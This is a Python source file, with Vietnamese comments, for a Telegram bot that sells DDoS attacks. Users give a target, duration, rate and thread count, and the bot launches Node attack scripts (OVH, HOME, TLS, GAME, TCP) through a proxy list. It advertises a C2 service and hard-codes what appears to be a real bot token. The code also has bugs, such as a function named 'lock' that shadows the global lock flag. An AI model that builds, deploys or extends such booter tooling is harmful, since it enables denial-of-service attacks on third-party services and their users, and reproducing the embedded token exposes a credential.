from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import subprocess
import json

TOKEN = '6151599157:AAEXFXPYCjjSpCusnHQeALrbEppY32qQdrc'
ADMIN_ID = 7360500930  # Thay bằng ID của admin
users = set()  # Set để lưu danh sách người dùng được phép
lock = False  # Cờ để kiểm tra trạng thái khóa
USER_FILE = 'users.json'  # File để lưu danh sách người dùng

# Hàm lưu danh sách người dùng vào file
def save_users():
    with open(USER_FILE, 'w') as f:
        json.dump(list(users), f)

# Hàm tải danh sách người dùng từ file
def load_users():
    global users
    try:
        with open(USER_FILE, 'r') as f:
            users = set(json.load(f))
    except FileNotFoundError:
        users = set()

async def start(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text(
        'Welcome to Xiao DDoS Bot!\n\n'
        'XiaoNam Bot Free and Paid DDoS Attack Services\n\n'
        'Type /attack to see the attack usage!\n\n'
        '----------------------------------------------\n\n'
        'Best C2/API Of 2024 -> @Xiaocoderz🚀'
    )

async def help_command(update: Update, context: CallbackContext) -> None:
    help_text = (
        'HOME - Basic home method\n'
        'TLS  - Basic TLS attack\n'
        'GAME - Basic game server attack\n'
        'TCP  - Basic TCP attack\n\n'
        '---- /attack to see how to attack.\n\n'
        'Want more power & methods? https://t.me/Xiaocoderz'
    )
    await update.message.reply_text(help_text)

# Tạo hàm cho mỗi phương thức tấn công
async def ovh_method(update: Update, context: CallbackContext) -> None:
    await attack(update, context, method="OVH")

async def home_method(update: Update, context: CallbackContext) -> None:
    await attack(update, context, method="HOME")

async def tls_method(update: Update, context: CallbackContext) -> None:
    await attack(update, context, method="TLS")

async def game_method(update: Update, context: CallbackContext) -> None:
    await attack(update, context, method="GAME")

async def tcp_method(update: Update, context: CallbackContext) -> None:
    await attack(update, context, method="TCP")

# Hàm tấn công chung cho các phương thức
async def attack(update: Update, context: CallbackContext, method=None) -> None:
    global lock
    if lock and update.message.from_user.id not in users:
        await update.message.reply_text('Access denied. Please contact admin.')
        return

    if len(context.args) != 4:
        await update.message.reply_text('Usage: /attack <TARGET> <TIME> <RATES> <THREAD>')
        return

    target, time, rates, thread = context.args
    proxy_file = 'proxy.txt'

    sender_name = update.message.from_user.full_name  # Lấy tên đầy đủ của người dùng

    # Đưa thông báo ngay lập tức
    await update.message.reply_text(
        f'Attack successfully sent with {method} method!\n\n'
        f'- 🚀 Target: {target} | Time: {time} | Rates: {rates} | Thread: {thread}\n\n'
        f'👤 Sender: {sender_name}\n\n'
        f'------------------------------------\n\n'
        f'Best C2/API of 2024 -> @Xiaocoderz'
    )

    command = ['node', f'{method}.js', target, time, rates, thread, proxy_file]
    
    try:
        # Gọi lệnh thực thi nhưng không cần đợi kết quả
        subprocess.run(command, capture_output=True, text=True)

        # Lưu tên người dùng vào danh sách
        users.add(update.message.from_user.id)
        save_users()

    except subprocess.CalledProcessError as e:
        await update.message.reply_text(f'Error: {e}')

async def add_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('Access denied. Only admin can use this command.')
        return

    if len(context.args) != 1:
        await update.message.reply_text('Usage: /adduser <USER_ID>')
        return

    user_id = int(context.args[0])
    users.add(user_id)
    save_users()
    await update.message.reply_text(f'User {user_id} added successfully.')

async def remove_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('Access denied. Only admin can use this command.')
        return

    if len(context.args) != 1:
        await update.message.reply_text('Usage: /removeuser <USER_ID>')
        return

    user_id = int(context.args[0])
    users.discard(user_id)
    save_users()
    await update.message.reply_text(f'User {user_id} removed successfully.')

async def lock(update: Update, context: CallbackContext) -> None:
    global lock
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('Access denied. Only admin can use this command.')
        return

    lock = True
    await update.message.reply_text('Bot is now locked. Only added users can use /attack.')

async def unlock(update: Update, context: CallbackContext) -> None:
    global lock
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('Access denied. Only admin can use this command.')
        return

    lock = False
    await update.message.reply_text('Bot is now unlocked. Everyone can use /attack.')

def main() -> None:
    load_users()  # Tải danh sách người dùng từ file khi khởi động bot
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('help', help_command))
    application.add_handler(CommandHandler('attack', attack))
    application.add_handler(CommandHandler('adduser', add_user))
    application.add_handler(CommandHandler('removeuser', remove_user))
    application.add_handler(CommandHandler('lock', lock))
    application.add_handler(CommandHandler('unlock', unlock))

    # Thêm các phương thức tấn công
    application.add_handler(CommandHandler('ovh', ovh_method))
    application.add_handler(CommandHandler('home', home_method))
    application.add_handler(CommandHandler('tls', tls_method))
    application.add_handler(CommandHandler('game', game_method))
    application.add_handler(CommandHandler('tcp', tcp_method))

    application.run_polling()

if __name__ == '__main__':
    main()
